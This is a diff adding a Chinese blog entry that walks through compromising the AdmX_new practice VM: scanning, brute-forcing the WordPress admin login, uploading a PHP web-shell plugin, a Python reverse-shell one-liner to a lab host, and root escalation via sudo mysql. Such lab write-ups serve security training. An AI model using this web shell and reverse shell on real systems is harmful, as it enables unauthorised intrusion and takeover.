@@ -8,6 +8,160 @@
 ]]></content>
   </entry>
   <entry>
+    <title>AdmX_new</title>
+    <url>/2022/11/05/AdmX-new/</url>
+    <content><![CDATA[<p><strong>0x01 主机发现</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 10.0.2.0/24</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/11/05/AdmX-new/01.png" class title="This is an example image">
+
+<p>前 1-4 为虚拟机占用的IP，靶机IP为 10.0.2.7</p>
+<p><strong>0x02 端口扫描</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.7</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/11/05/AdmX-new/02.png" class title="This is an example image">
+
+
+
+<p><strong>0x03 服务识别</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -p80 -sV 10.0.2.7</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/11/05/AdmX-new/03.png" class title="This is an example image">
+
+
+
+<p><strong>0x04 web服务探测</strong></p>
+<p>靶机只开放了 80 端口，尝试访问</p>
+<img src="/2022/11/05/AdmX-new/04.png" class title="This is an example image">
+
+<p>尝试路径爆破（使用 feroxbuster 或 dirsearch 都可以 ，字典使用的 kali 内置）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">feroxbuster --url http://10.0.2.7 -w /usr/share/dirb/wordlists/common.txt</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果，出现了很多 wordpress 字样，可以判断网站用的 wordpress 框架</p>
+<img src="/2022/11/05/AdmX-new/06.png" class title="This is an example image">
+
+
+
+<p>访问登录页面，可以看到页面持续加载，并且左下角一直在请求 192.168.159.145 这个地址</p>
+<img src="/2022/11/05/AdmX-new/07.png" class title="This is an example image">
+
+<img src="/2022/11/05/AdmX-new/08.png" class title="This is an example image">
+
+
+
+<p>抓个包看看</p>
+<img src="/2022/11/05/AdmX-new/09.png" class title="This is an example image">
+
+
+
+<p>可以看到有多个请求指向 192.168.159.145 这个地址，请求的资源还都是 wordpress 相关，由于请求不成功才导致页面的卡顿。尝试让页面加载时的请求全部指向本机。配置如下：</p>
+<img src="/2022/11/05/AdmX-new/10.png" class title="This is an example image">
+
+
+
+<p>类似于访问国外网站失败，重定向到国内镜像网站。也可用浏览器插件 Redirector  实现重定向。</p>
+<p>burp 中配置的 Response header &amp; Response body。</p>
+<p>现在再访问试试，正常显示。</p>
+<img src="/2022/11/05/AdmX-new/11.png" class title="This is an example image">
+
+
+
+<p><strong>0x05 暴力破解 &amp; 后台命令执行</strong></p>
+<p>尝试默认账号密码登录，失败了，但确定有 admin 账户。</p>
+<img src="/2022/11/05/AdmX-new/12.png" class title="This is an example image">
+
+
+
+<p>尝试密码爆破，这时候就看字典强大与否了，毕竟wp的漏洞利用基本都要登录后台。其实这里也可以使用 kali 自带的 wpscan，但需要代理请求，设置IP转发，所以暂时先没用，试试能不能爆破出来密码。</p>
+<img src="/2022/11/05/AdmX-new/13.png" class title="This is an example image">
+
+
+
+<p>成功登录后台，Wordpress Version 5.7.1</p>
+<img src="/2022/11/05/AdmX-new/14.png" class title="This is an example image">
+
+
+
+<p>后台 getshell | 命令注入的思路一般为：<br>1、Mdedia——上传软件包<br>2、Appearance——编辑页面主题 例如：404Template.php，插入恶意代码<br>3、Plugins——上传自定义恶意插件，压缩成zip、 激活插件</p>
+<p>操作上，自定义插件是最灵活的。创建 exp.php 文件，代码如下，格式必须固定：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Plugin Name: WebShell</span></span><br><span class="line"><span class="comment">Plugin URI: https://yunju.blog.csdn.net/</span></span><br><span class="line"><span class="comment">Description: mu</span></span><br><span class="line"><span class="comment">Author: myname</span></span><br><span class="line"><span class="comment">Version: 1.0</span></span><br><span class="line"><span class="comment">Author URI: https://yunju.blog.csdn.net/</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>压缩成 zip 格式才能上传，上传后记得激活才能生效</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zip exp.zip exp.php</span><br></pre></td></tr></table></figure>
+
+<p>访问插件路径（建议下载目标框架源码看看各种对外路径）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.7/wordpress/wp-content/plugins/exp.php?cmd=id</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/11/05/AdmX-new/15.png" class title="This is an example image">
+
+
+
+<p>能够执行命令后，收集环境信息，如果能够直接执行 php 或是 python 那就反弹 shell ，如果有长度限制的话就反弹个 nc。查找命令可以看到有 Python3 环境。 </p>
+<img src="/2022/11/05/AdmX-new/16.png" class title="This is an example image">
+
+
+
+<p>执行 pyhton 反弹 shell 命令：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import os,subprocess,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/11/05/AdmX-new/17.png" class title="This is an example image">
+
+
+
+<p><strong>0x06 一次提权</strong></p>
+<p>可以看到当前为普通权限，由于当前没有bash权限，也执行不了sudo查看是否有配置不当。先查看内核信息，无提权可用</p>
+<img src="/2022/11/05/AdmX-new/18.png" class title="This is an example image">
+
+
+
+<p>WP 框架要记得去看配置信息，wp-config.php</p>
+<img src="/2022/11/05/AdmX-new/19.png" class title="This is an example image">
+
+
+
+<p>查看当前系统有什么账户</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls /home</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/11/05/AdmX-new/20.png" class title="This is an example image">
+
+
+
+<p>可以直接知道 MySQL 用户 <code>admin</code> 和密码 <code>Wp_Admin#123</code>，但登录数据库报错。切换用户也报错。试了下之前登录的密码 adam14，成功切换到 wpadmin 账户。</p>
+<img src="/2022/11/05/AdmX-new/21.png" class title="This is an example image">
+
+
+
+<p>在 &#x2F;home&#x2F;wpadmin 下拿到了第一个flag</p>
+<img src="/2022/11/05/AdmX-new/22.png" class title="This is an example image">
+
+
+
+<p><strong>0x07 二次提权</strong></p>
+<p>执行 sudo -l </p>
+<img src="/2022/11/05/AdmX-new/23.png" class title="This is an example image">
+
+<p>可使用 root 用户 执行 mysql 操作，而 mysql 中是有 system这个函数的，由于之前尝试 WP 配置文件中的密码错误，那么就再尝试一开始的登录密码 adam14，提权步骤如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1、sudo /usr/bin/mysql -u root -D wordpress -p #密码adam14</span><br><span class="line">2、\! /bin/bash #切换到 root 权限的命令行</span><br></pre></td></tr></table></figure>
+
+<p>读取 root 目录下的 flag</p>
+<img src="/2022/11/05/AdmX-new/24.png" class title="This is an example image">
+
+
+
+<p><strong>0x08 出现的意外及注意点</strong></p>
+<p>1、不知为何，我这边的反弹 shell 都是不带用户名的，因此命令执行是否成功也不知道，就像这样。</p>
+<img src="/2022/11/05/AdmX-new/25.png" class title="This is an example image">
+
+<p>2、通常遇到 wordpress 框架，首先识别版本号，但由于此目标网站下的识别文件已移除，无法直接地识别。另一方面就是采用 wpscan 进行扫描，由访问有问题就没有直接使用了。</p>
+]]></content>
+      <categories>
+        <category>红队</category>
+      </categories>
+      <tags>
+        <tag>靶机</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CHRONOS</title>
     <url>/2022/10/29/CHRONOS/</url>
     <content><![CDATA[<p><strong>0x01 主机发现</strong></p>
